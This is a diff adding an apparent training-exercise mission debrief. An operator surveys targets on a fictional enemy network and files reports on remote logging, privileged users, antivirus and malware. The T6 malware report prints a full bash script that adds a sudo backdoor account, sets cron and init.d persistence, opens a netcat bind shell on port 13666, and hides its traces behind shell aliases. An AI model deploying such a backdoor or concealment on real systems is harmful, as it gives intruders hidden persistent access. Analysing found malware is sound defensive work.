@@ -1,0 +1,462 @@
+***MISSION DEBRIEF***
+Operator: LCpl Bonestroo
+Operation: BB02
+MC: MC2
+Analyst: Analyst2
+Description: The goal of this operation was to perform survey of listed user devices within the Krasnovian 3rd Armour BDE internal network (192.186.169.0/24). The operation was an overall success. Operator redirected from EXT_RTR to CHATSVR to Vyos2 to ADMIN2 to T5 back out to T4 to T6 back to T4 then finally to T7 before exit vetting and disconnecting from the network. T1 had remote logging. T2 had abnormal logging and a privileged user. T3 appeared to be a clean box. T4 didn't have anything that wasn't already in the NSDB; operator was not able to conduct device survey due to NSDB restriction. T5 has a privileged user, abnormal logging, and remote logging; operator was told by EA to not conduct a device survey, operator did catalog user accounts and login data. T6 had a privileged user, remote logging, and malware; operator conducted a device survey, cataloged user accounts and login data. T7 had a security product; operator conducted a device survey, cataloged user accounts and login data.
+
+
+Result: Passed
+
+Notes:
+Did not name survey file correctly
+DId not notify analyst of user survey on T7
+
+
+Date:2024-05-20 
+Start time: 0900
+End time: 1500
+
+=========================
+T1: 10.50.34.234 // 10.20.169.33
+=========================
+X-----------------------
+NSDB:
+
+Abnormal Logging
+  Provide process name/options, PID, Parent ID, user
+  Name: rsyslog PID: 9052 PPID: 1 User: root
+  Provide location of configuration file and it's abnormal or irregular contents - /etc/rsyslog.conf
+  Provide hostname or IP of where logs are being sent - 10.50.22.142
+  Provide any network connections opened/established by abnormal logging - unconnected 0.0.0.0:34039  0.0.0.0:*
+  Provide brief description of the abnormal, irregular or remote logging and a link to open source documentation if available. - rsyslog is remote logging to 10.50.22.142 on port 514, sending all logs.
+  Recommendation - CM; we have already been caught; we are just doing normal commands on this box and redirecting.
+
+
+
+
+MC:
+
+*****Abnormal Logging Report*****
+Target: T1: 10.50.34.234
+Name - rsyslog
+PID - 9052
+PPID - 1
+User - root
+Location of config file - /etc/rsyslog.conf
+Remote IP (hostname if IP cannot be identified) - 10.50.22.142
+Network connections - unconnected 0.0.0.0:34039  0.0.0.0:*
+Documentation - https://www.tenable.com/audits/items/CIS_Red_Hat_EL5_v2.2.1_L1.audit:056c4e6e4f4a36d4be92c5d7cee4f608
+Description - rsyslog is remote logging to 10.50.22.142 on port 514, sending all logs.
+Recommendation - CM; we have already been caught; we are just doing normal commands on this box and redirecting.
+*****End of Report*****
+
+
+
+
+------------------------X
+=========================
+
+=========================
+T2: 10.20.169.10
+=========================
+X-----------------------
+NSDB:
+
+Privileged Users
+  Target - Where did you see this user? - T2: 10.20.169.10 
+  User - What is their username? - Administrator
+  Access time - How long have they been on? - 5/20/2024 12:21 PM
+  Access method - Did they access locally? Remotely? - local
+    Provide all relevant details - console login, no network connection
+  Privileges - What are they capable of doing? - Administrators have complete and unrestricted access to the computer/domain
+  Activity - What are they currently doing? - Admin is logged in and active; running baretail.exe from a terminal/command prompt
+  Recommendation - CM; we are just running basic commands and then redirecting; be cautious for any future ops if planning on doing any effects.
+
+Abnormal Logging
+  Provide process name/options, PID, Parent ID, user
+  Name: baretail.exe PID: 788 PPID: 2768 User: Administrator
+  Provide location of configuration file and it's abnormal or irregular contents - C:\Users\Administrator\Downloads\baretail.exe
+  Provide hostname or IP of where logs are being sent - N/A
+  Provide any network connections opened/established by abnormal logging - N/A
+  Provide brief description of the abnormal, irregular or remote logging and a link to open source documentation if available. - Baretail is a free real-time log file monitoring tool. Can also be used like tail on Linux. Admin is most likely only installing baretail since it is beinbg run from Downloads directory with no trace in any other directory.
+https://www.baremetalsoft.com/baretail/
+  Recommendation - CM; we are just running basic commands and then redirecting; be cautious for any future ops if planning on doing any effects.
+
+
+
+MC:
+
+*****Privileged User Report*****
+Target: T2: 10.20.169.10
+User - Administrator
+Access Time - 5/20/2024 12:21 PM
+Access Method - local
+Privileges - Administrators have complete and unrestricted access to the computer/domain
+Activity - Admin is logged in and active; running baretail.exe from a terminal/command prompt
+Description - Admin is actively logged in and has been for around an hour. They have a console login and are running baretail.exe. Baretail is a free real-time log file monitoring tool.
+Recommendation - CM; we are just running basic commands and then redirecting; be cautious for any future ops if planning on doing any effects.
+*****End of Report*****
+
+*****Abnormal Logging Report*****
+Target: T2: 10.20.169.10
+Name - baretail.exe
+PID - 788
+PPID - 2768
+User - administrator
+Location of config file - C:\Users\Administrator\Downloads\baretail.exe
+Remote IP (hostname if IP cannot be identified) - N/A
+Network connections - N/A
+Documentation - https://www.baremetalsoft.com/baretail/
+Description - Baretail is a free real-time log file monitoring tool. Can also be used like tail on Linux. Admin is most likely only installing baretail since it is being run from Downloads directory with no trace in any other directory.
+Recommendation - CM; we are just running basic commands and then redirecting; be cautious for any future ops if planning on doing any effects.
+*****End of Report*****
+
+
+
+------------------------X
+=========================
+
+=========================
+T3: 10.20.169.239
+=========================
+X-----------------------
+NSBD:
+
+Clean Box
+
+
+
+MC:
+
+
+
+
+
+------------------------X
+=========================
+
+=========================
+T4: 192.186.169.133
+=========================
+X-----------------------
+NSDB:
+
+Abnormal Logging
+  Provide process name/options, PID, Parent ID, user
+  Name: pacct PID: N/A PPID: N/A User: root
+  Provide location of configuration file and it's abnormal or irregular contents - /var/account/pacct
+  Provide hostname or IP of where logs are being sent - N/A
+  Provide any network connections opened/established by abnormal logging - N/A
+  Provide brief description of the abnormal, irregular or remote logging and a link to open source documentation if available. - Process accounting is the method of recording and summarizing commands executed on Linux
+https://www.syslog-ng.com/technical-documents/doc/syslog-ng-open-source-edition/3.16/release-notes/pacct-collecting-process-accounting-logs-on-linux
+  Recommendation - CM; we have already been caught and we are just running basic commands; do not do survey or use anything other than scp for collect.
+
+
+
+MC:
+
+*****Abnormal Logging Report*****
+Target: T4: 192.186.169.133
+Name - pacct
+PID - N/A
+PPID - N/A
+User - root
+Location of config file - /var/account/pacct
+Remote IP (hostname if IP cannot be identified) - N/A
+Network connections - N/A
+Documentation - https://www.syslog-ng.com/technical-documents/doc/syslog-ng-open-source-edition/3.16/release-notes/pacct-collecting-process-accounting-logs-on-linux
+Description - Process accounting is the method of recording and summarizing commands executed on Linux
+Recommendation - CM; we have already been caught and we are just running basic commands; do not do survey or use anything other than scp for collect.
+*****End of Report*****
+
+
+
+
+------------------------X
+=========================
+
+=========================
+T5: 192.186.169.201
+=========================
+X-----------------------
+NSDB:
+
+Privileged Users
+  Target - Where did you see this user? - T5: 192.186.169.201
+  User - What is their username? - radicle
+  Access time - How long have they been on? - 12:58; idle for 1:49m
+  Access method - Did they access locally? Remotely? - remote
+    Provide all relevant details - pts, network connection, ssh
+  Privileges - What are they capable of doing? - privileged access to root commands - root privilege, is the highest level of access permissions given on a computer or network system
+  Activity - What are they currently doing? - ssh'd on, running tcpdump on loopback and writing to /var/log/tcpdump.pcap
+  Recommendation - CM; we are running basic commands and disconnecting.
+
+Abnormal Logging
+  Provide process name/options, PID, Parent ID, user
+  Name: tcpdump PID: 1606 PPID: 1590 User: root, but run by radicle using sudo
+  Provide location of configuration file and it's abnormal or irregular contents - /usr/sbin/tcpdump; /var/log/tcpdump.pcap
+  Provide hostname or IP of where logs are being sent - N/A
+  Provide any network connections opened/established by abnormal logging - tcp  LISTEN 0      128              127.0.0.53%lo:53              0.0.0.0:*   
+  Provide brief description of the abnormal, irregular or remote logging and a link to open source documentation if available. - tcpdump is running on loopback and writing to /var/log/tcpdump.pcap
+https://www.tcpdump.org/
+  Recommendation - CM; tcpdump is running on their loopback, should not pickup anything we are doing on this box for this Op.
+
+Abnormal Logging
+  Provide process name/options, PID, Parent ID, user
+  Name: rsyslog PID: 928 PPID: 1 User: syslog
+  Provide location of configuration file and it's abnormal or irregular contents - /etc/rsyslog.d/50-default.conf
+  Provide hostname or IP of where logs are being sent - 129.168.169.186
+  Provide any network connections opened/established by abnormal logging - N/A
+  Provide brief description of the abnormal, irregular or remote logging and a link to open source documentation if available. - Rsyslog is enabled with remote logging. It is sending all logs to 129.168.169.186 using port 514.
+https://www.rsyslog.com/doc/index.html
+  Recommendation - CM; we have already been caught; we are just running commands and getting off this box.
+
+
+MC:
+
+*****Privileged User Report*****
+Target: T5: 192.186.169.201
+User - radicle
+Access Time - 12:58; idle for 1:49m
+Access Method - remote; pts, network connection, ssh
+Privileges - privileged access to root commands - root privilege, is the highest level of access permissions given on a computer or network system
+Activity - sshed on, running tcpdump on loopback and writing to /var/log/tcpdump.pcap
+Description - radicle is a member of the sudo group, which means they have privileged access to root commands. They are currently sshed onto the box and are idle, but running tcpdump on loopback and writing to /var/log/tcpdump.pcap
+Recommendation - CM; we are running basic commands and disconnecting.
+*****End of Report*****
+
+*****Abnormal Logging Report*****
+Target: T5: 192.186.169.201
+Name - tcpdump
+PID - 1606
+PPID - 1590
+User - root, but run by radicle using sudo
+Location of config file - /usr/sbin/tcpdump; /var/log/tcpdump.pcap
+Remote IP (hostname if IP cannot be identified) - N/A
+Network connections - tcp  LISTEN 0      128              127.0.0.53%lo:53              0.0.0.0:*
+Documentation - https://www.tcpdump.org/
+Description - tcpdump is running on loopback and writing to /var/log/tcpdump.pcap
+Recommendation - CM; tcpdump is running on their loopback, should not pickup anything we are doing on this box for this Op.
+*****End of Report*****
+
+*****Abnormal Logging Report*****
+Target: T5: 192.186.169.201
+Name - rsyslog
+PID - 928
+PPID - 1
+User - syslog
+Location of config file - /etc/rsyslog.d/50-default.conf
+Remote IP (hostname if IP cannot be identified) - 129.168.169.186
+Network connections - N/A
+Documentation - https://www.rsyslog.com/doc/index.html
+Description - Rsyslog is enabled with remote logging. It is sending all logs to 129.168.169.186 using port 514.
+Recommendation - CM; we have already been caught; we are just running commands and getting off this box.
+*****End of Report*****
+
+
+
+-----------------------X
+=========================
+
+=========================
+T6: 192.186.169.202
+=========================
+X-----------------------
+NSDB:
+
+Privileged Users
+  Target - Where did you see this user? - T6: 192.186.169.202
+  User - What is their username? - root
+  Access time - How long have they been on? - 12:07; idle for 3:35m
+  Access method - Did they access locally? Remotely? - local
+    Provide all relevant details - tty, no network connection
+  Privileges - What are they capable of doing? - the highest level of access permissions given on a computer or network system
+  Activity - What are they currently doing? - Xorg running-GUI; in root's history, they made the .malice directory, created malice.sh, and Alias; also added malice.cron to cron.hourly, and ran malice.sh.
+  Recommendation - CM; root has been idle for a while; we are just running commands and getting off this box.
+
+Abnormal Logging
+  Provide process name/options, PID, Parent ID, user
+  Name: rsyslog PID: 4659 PPID: 1 User: root
+  Provide location of configuration file and it's abnormal or irregular contents - /etc/rsyslog.conf
+  Provide hostname or IP of where logs are being sent - 192.186.169.201
+  Provide any network connections opened/established by abnormal logging - 0 0.0.0.0:45258           0.0.0.0:*          4659/rsyslogd
+  Provide brief description of the abnormal, irregular or remote logging and a link to open source documentation if available. - rsyslog is remote logging; sending mail,news.none to 192.186.169.201 using port 1514.
+https://www.rsyslog.com/doc/index.html
+  Recommendation - CM; we are not really concerned with logs on this Op; running basic commands and disconnecting.
+
+Malware
+  Provide process name/options, PID, Parent ID, user, and hash
+  Name: malice PID: UNK PPID: UNK User: root
+  Hash: a0c66aa022cfb2cb7a2c2f4f7a3c4fd1
+  Provide file type of malware binary and supporting files - /.malice/malice.sh - executable-bash script; /.malice/Alias - text file
+  Provide any associated logs generated by malware - N/A
+  Provide location and lines of any persistence mechanisms - /etc/cron.hourly/malice.cron - #!/bin/bash; /.malice/malice.sh
+  Provide full path of malware files or support files - /.malice/malice.sh; /.malice/Alias
+  Provide any network connections opened/established by malware - N/A
+  Provide any identifiable text - /.malice/malice.sh
+if [ $(/bin/ls -latr /etc/init.d/ | grep malice | wc -l ) = 0 ]; then
+	echo "Not a morning person?"
+	sudo cp /.malice/malice.sh /etc/init.d/.malice
+	sudo chmod 755 /etc/init.d/.malice
+	echo "Rise and shine!"
+	echo "Wake up with a hot cup of coffee and a little bit of..."
+	/bin/ls -latr /etc/init.d/ | grep malice
+else
+	echo "Mmm... that's a nice cup of malice"
+	
+if [ $(/bin/ls -latr / | grep malice | wc -l ) = 0 ]; then
+	echo "Poor homeless Alice"
+	sudo mkdir /.malice
+	echo "Come on in"
+	sudo cp /etc/init.d/.malice /.malice/malice.sh
+	sudo chmod 755 /.malice/malice.sh
+	echo "Make yourself at home"
+	/bin/ls -latr /.malice | grep malice
+else
+	echo "Home, sweet home"
+
+if [ $(/bin/ls -latr /etc/cron.hourly/ | grep malice | wc -l ) = 0 ]; then
+	echo "What time is it?"
+	sudo echo "#!/bin/bash" > /etc/cron.hourly/.malice.cron
+	sudo echo "/.malice/malice.sh" > /etc/cron.hourly/.malice.cron
+	sudo chmod 755 /etc/cron.hourly/.malice.cron
+	echo "It's time for some..."
+	/bin/ls -latr /etc/cron.hourly/ | grep malice
+else
+	echo "Right on schedule"
+
+if [ $(/bin/cat /etc/passwd | grep m.alice | wc -l ) = 0 ]; then
+	echo "Alice doesn't live here anymore"
+	sudo useradd -g sudo -s /bin/bash -d /.malice -p $(echo malice | openssl passwd -1 -stdin) m.alice
+	echo "Knock knock!"
+	echo "Who's there?"
+	/bin/cat /etc/passwd | grep m.alice
+else
+	echo "Alice is already here"
+fi
+
+if [ $(sudo /bin/cat /root/.bashrc | grep Alice | wc -l) = 0 ]; then
+	echo "root put Alice in a corner"
+	tail -n 10 /.malice/malice > /.malice/alias
+	sudo /bin/cat /.malice/alias >> /root/.bashrc
+	for file in $(ls -d /home/useraccounts/*/.bashrc); do sudo /bin/cat /.malice/alias >> "$file" ; done
+	echo "Nobody puts Alice in a corner"
+else
+	sudo /bin/cat /root/.bashrc | grep Alice
+fi
+	
+if [ $(which netcat) = 0 ]; then
+	echo "Here kitty kitty kitty"
+	sudo apt-get install -y netcat
+else
+	echo "Good kitty."
+fi
+
+if [ $(sudo /bin/netstat -auntp | grep "13666" | wc -l) = 0 ]; then
+	echo "Letting the cat in"
+	sudo /bin/netcat -knlvp 13666 -e /bin/bash &
+else
+	echo "Hello kitty"
+fi
+
+#Malicious Alice back at it again with the white Vans
+alias malice="echo 'Malicious Alice is in your house, eating your chips'"
+alias ps='f(){ ps "$@" | grep -v netcat | grep -v m.alice ; unset -f f; }; f'
+alias netstat='f(){ netstat "$@" | grep -v 13666 ; unset -f f; }; f'
+alias w='f(){ w "$@" | grep -v m.alice ; unset -f f; }; f'
+alias cat='f(){ cat "$@" | grep -v m.alice ; unset -f f; }; f'
+
+  Provide any/all modules/.dlls/etc loaded by malware - N/A
+  Provide brief description of malware purpose/actions and capabilities - malice is a if else script that if certain commands are run it will echo some phrases, and run some other commands, will also set aliases.
+  Provide link to open source documentation if available - open source just has a VirusTotal clone that is local; not what this malice is
+  Recommendation - CM cautiously; do what we have to do and get off the box. should be fine for this Op, just be careful of the changes that can be made.
+
+
+MC:
+
+*****Privileged User Report*****
+Target: T6: 192.186.169.202
+User - root
+Access Time - 12:07; idle for 3:35m
+Access Method - local; tty, no network connection
+Privileges - the highest level of access permissions given on a computer or network system
+Activity - Xorg running-GUI; in root's history, they made the .malice directory, created malice.sh, and Alias; also ad
+ded malice.cron to cron.hourly, and ran malice.sh.
+Description - root is logged on and has been idle for over 3 hours. They are running xorg and previously made the .malice directory, created malice.sh, and Alias; also ad
+ded malice.cron to cron.hourly, and ran malice.sh.
+Recommendation - CM; root has been idle for a while; we are just running commands and getting off this box.
+*****End of Report*****
+
+*****Abnormal Logging Report*****
+Target: T6: 192.186.169.202
+Name - rsyslog
+PID - 4659
+PPID - 1
+User - root
+Location of config file - /etc/rsyslog.conf
+Remote IP (hostname if IP cannot be identified) - 192.186.169.201
+Network connections - 0.0.0.0:45258           0.0.0.0:*          4659/rsyslogd
+Documentation - https://www.rsyslog.com/doc/index.html
+Description - rsyslog is remote loggin
+g; sending mail,news.none to 192.186.169.201 using port 1514.
+Recommendation - CM; we are not really concerned with logs on this Op; running basic commands and disconnecting.
+*****End of Report*****
+
+*****Malware Report*****
+Target: T6: 192.186.169.202
+Name - malice
+Hash - a0c66aa022cfb2cb7a2c2f4f7a3c4fd1
+PID - UNK
+PPID - UNK
+User - root
+File type - /.malice/malice.sh - executable-bash script; /.malice/Alias - text file
+Supporting files - /.malice/malice.sh, /.malice/Alias
+Associated Logs - N/A
+Persistence - /etc/cron.hourly/malice.cron - #!/bin/bash; /.malice/malice.sh
+Documentation - open source just has a VirusTotal clone that is local; not what this malice is
+Description - malice is a if else script that if certain commands are run it will echo some phrases, and run some other commands, will also set aliases.
+Recommendation - CM cautiously; do what we have to do and get off the box. should be fine for this Op, just be careful of the changes that can be made.
+*****End of Report*****
+
+
+-----------------------X
+=========================
+
+=========================
+T7: 192.186.169.203
+=========================
+X-----------------------
+NSDB:
+
+Security Products
+  Name and version of the product - Kaspersky ver 21.17.7.539
+  Installation folder - c:\Program Files (x86)\Kaspersky Lab\Kaspersky 21.17
+  Directory location of associated logs - N/A
+  Timestamp of all associated log files - N/A
+  Cloud based?; no
+  Can we read the logs?; no
+    If Yes, put the most recent 5 lines of logs in your NSDB File
+    If No, why? - no Kaspersky logs found
+  Recommendation - CM; we are not putting anything on this box that would be caught by Kaspersky.
+
+
+
+
+MC:
+
+*****Security Product Report*****
+Target: T7: 192.186.169.203
+Name - Kaspersky
+Version - 21.17.7.539
+(WIN) Primary registry key - HKEY_LOCAL_MACHINE\software\KasperskyLab
+(NIX) Config file or install directory - N/A
+Documentation - https://usa.kaspersky.com/
+Recommendation - CM; we are not putting anything on this box that would be caught by Kaspersky.
+*****End of Report*****
+
+
+
+
+-----------------------X
+=========================
